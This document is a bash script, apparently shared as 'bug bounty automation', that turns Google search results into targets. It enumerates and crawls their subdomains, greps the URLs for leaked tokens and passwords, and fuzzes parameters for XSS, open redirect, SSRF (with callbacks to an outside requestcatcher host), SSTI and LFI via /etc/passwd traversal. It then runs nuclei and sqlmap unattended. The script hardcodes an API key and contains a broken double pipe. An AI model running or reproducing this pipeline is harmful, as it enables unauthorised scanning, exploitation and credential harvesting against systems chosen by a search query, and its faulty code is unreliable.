#!/bin/bash

# Default values
LIMIT=10
QUERY="inurl:/bug bounty"

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        --limit) LIMIT="$2"; shift ;;
        --query) QUERY="$2"; shift ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# Ensure required Python packages are installed
if ! python3 -c "import googlesearch" &>/dev/null; then
    echo "Installing googlesearch-python..."
    pip install googlesearch-python
fi

if ! python3 -c "import tldextract" &>/dev/null; then
    echo "Installing tldextract..."
    pip install tldextract
fi

# Fetch Google results and extract main domains
python3 - <<EOF
from googlesearch import search
import tldextract

query = "$QUERY"
num_results = int("$LIMIT")

results = search(query, num_results=num_results)

unique_domains = set()
for url in results:
    extracted = tldextract.extract(url)
    main_domain = f"{extracted.domain}.{extracted.suffix}"
    if main_domain:
        unique_domains.add(main_domain)

with open("bug_bounty_domains.txt", "w") as f:
    for domain in unique_domains:
        print(domain)
        f.write(domain + "\n")
EOF

echo "Extraction complete! Check 'bug_bounty_domains.txt'"

echo "==================================="
echo "💀 Salaar Bug Bounty Automation 💀"
echo "==================================="

# Enumerate subdomains
echo "[+] Enumerating subdomains..."
subfinder -dL bug_bounty_domains.txt >> subs-temp.txt

echo "[+] Enumerating subdomains using assetfinder... "
cat bug_bounty_domains.txt | assetfinder --subs-only >> subs-temp.txt

echo "[+] Enumerating subdomains using crt.sh ...."
cat bug_bounty_domains.txt | while read -r domain; do
    curl -s "https://crt.sh/?q=%.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g'
done | sort -u >> subs-temp.txt

echo "[+] Enumerating subdomains using chaos ...."
cat bug_bounty_domains.txt | chaos -silent -key 6aa57816-004b-429c-a02b-d1344c1abeb7 >> subs-temp.txt

echo "[+] Clearing Duplicate subdomains ...."
cat subs-temp.txt | sort -u | shuf | tee subdomains.txt
rm subs-temp.txt

echo "[+] Running httpx ...."
cat subdomains.txt | httpx -silent -o live-subdomains.txt

# Crawl URLs and extract data
echo "[+] Running katana ...."
cat live-subdomains.txt | katana -d 5 -o /opt/katana-urls.txt
grep "=" /opt/katana-urls.txt | qsreplace salaar >> /opt/temp-params.txt
grep ".js" /opt/katana-urls.txt >> /opt/temp-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/katana-urls.txt >> /opt/temp-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/katana-urls.txt >> /opt/temp-wordpress.txt
rm /opt/katana-urls.txt

echo "[+] Running urlfinder ...."
cat subdomains.txt | urlfinder >> /opt/urlfinder-urls.txt
grep "=" /opt/urlfinder-urls.txt | qsreplace salaar >> /opt/temp-params.txt
grep ".js" /opt/urlfinder-urls.txt >> /opt/temp-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/urlfinder-urls.txt >> /opt/temp-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/urlfinder-urls.txt >> /opt/temp-wordpress.txt
rm /opt/urlfinder-urls.txt

echo "[+] Running hakrawler ...."
cat live-subdomains.txt | hakrawler -u -i -insecure >> /opt/hakrawler-urls.txt
grep "=" /opt/hakrawler-urls.txt | qsreplace salaar >> /opt/temp-params.txt
grep ".js" /opt/hakrawler-urls.txt >> /opt/temp-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/hakrawler-urls.txt >> /opt/temp-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/hakrawler-urls.txt >> /opt/temp-wordpress.txt
rm /opt/hakrawler-urls.txt

echo "[+] Running waybackurls ...."
for domain in $(cat subdomains.txt); do  
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original" | sort -u >> /opt/wayback-urls.txt  
    sleep $((RANDOM % 5 + 3))  # Random delay (3-7 seconds)
done

grep "=" /opt/wayback-urls.txt   | qsreplace salaar >> /opt/temp-params.txt
grep ".js" /opt/wayback-urls.txt   >> /opt/temp-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/wayback-urls.txt   >> /opt/temp-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/wayback-urls.txt   >> /opt/temp-wordpress.txt
rm /opt/wayback-urls.txt  

# Consolidate Data
cat /opt/temp-params.txt | sort -u | tee params.txt
rm /opt/temp-params.txt
cat /opt/temp-js-files.txt | sort -u | tee js-files.txt
rm /opt/temp-js-files.txt
cat /opt/temp-secrets.txt | sort -u | tee secrets.txt
rm /opt/temp-secrets.txt
cat /opt/temp-wordpress.txt | sort -u | tee wordpress.txt
rm /opt/temp-wordpress.txt


# Parameter Fuzzing
echo "[+] Fuzzing for XSS..."
cat params.txt | grep -Eiv '\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)($|[?&])' | shuf | qsreplace '<u>hyper</u>' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "<u>hyper" && echo "$host"
done | tee htmli.txt

echo "[+] Fuzzing for Open Redirects..."
cat params.txt | qsreplace 'https://example.com/' | while read -r host; do
    curl -s -L "$host" | grep "<title>Example Domain</title>" && echo "$host"
done | tee open-redirects.txt

echo "[+] Fuzzing for SSRF..."
cat params.txt | qsreplace 'https://salaar.requestcatcher.com/test' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "request caught" && echo "$host"
done | tee ssrf.txt

# JS File Analysis
echo "[+] Running Nuclei on JS Files ...."
cat js-files.txt | nuclei -t /root/nuclei-templates/http/exposures/ -o nuclei-js-results.txt
echo "[+] Running Mantra on JS Files ...."
cat js-files.txt | mantra > js-mantra-results.txt

# Domain Vulnerability Scanning
echo "[+] Running Nuclei on live subdomains..."
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity low -rl 3 -c 2 -silent -o nuclei-low.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity medium -rl 3 -c 2 -silent -o nuclei-medium.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity unknown -rl 3 -c 2 -silent -o nuclei-unknown.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity high -rl 3 -c 2 -silent -o nuclei-high.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity critical -rl 3 -c 2 -silent -o nuclei-critical.txt
# Merge Nuclei results
cat nuclei-*.txt | sort -u > nuclei-results.txt
rm nuclei-*.txt

echo "[+] Fuzzing for SSTI..."
cat params.txt | | grep -E "template=|preview=|id=|view=|activity=|name=|content=|redirect=" \
| shuf | qsreplace 'salaar{{7*7}}' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "salaar49" && echo "$host"
done | tee ssti.txt

echo "[+] Fuzzing for LFI..."
cat params.txt | grep -E "file=|document=|folder=|root=|path=|pg=|style=|pdf=|template=|php_path=|doc=|page=|name=|cat=|dir=|action=|board=|date=|detail=|download=|prefix=|include=|inc=|locate=|show=|site=|type=|view=|content=|layout=|mod=|conf=|url=" \
| shuf | qsreplace '../../../../../../etc/passwd' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "root:x" && echo "$host"
done | tee lfi.txt

# SQLMAP
mkdir sqlmap-results
cat params.txt | grep -Ei 'select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter' | python3 /opt/sqlmap/sqlmap.py --batch --banner  --output-dir=sqlmap-results/


echo "✅ Script execution completed!"
